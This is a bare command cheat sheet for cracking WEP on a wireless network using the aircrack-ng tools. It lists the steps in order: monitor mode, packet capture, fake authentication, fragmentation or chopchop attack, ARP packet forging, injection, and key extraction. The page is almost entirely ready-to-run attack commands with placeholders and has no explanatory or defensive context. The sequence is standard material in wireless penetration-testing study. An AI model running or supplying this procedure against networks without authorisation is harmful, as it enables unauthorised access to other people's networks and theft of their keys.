 **Start Interface**  
```bash
airmon-ng start <interface> <AP channel>  
```
  
**Start Dump Capture**  
```bash
airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface> 
```
  
  
**Fake Authenticate to AP**  
```bash
aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>  
```
  
**Launch Fragmentation Attack (5) or KoreK chopchop attack (4)**  
```bash
aireplay-ng -4 -b <AP MAC> -h <Your MAC> <interface>  
```

**OR**  

```bash
aireplay-ng -5 -b <AP MAC> -h <Your MAC> <interface>  
```
  
**Craft ARP request Packet using Packet Forge**  
```bash
packetforge-ng -0 -a <AP MAC> -h <Your MAC> -l <Source IP> -k <Dest IP> -y <xor filename> -w <output filename>  
```
  
**Inject Packet into the network** 
```bash
aireplay-ng -2 -r <packet filename> <interface>  
```
  
**Extract Key from Capture after enough IVs have been generated**  
```bash
aircrack-ng <capture>
```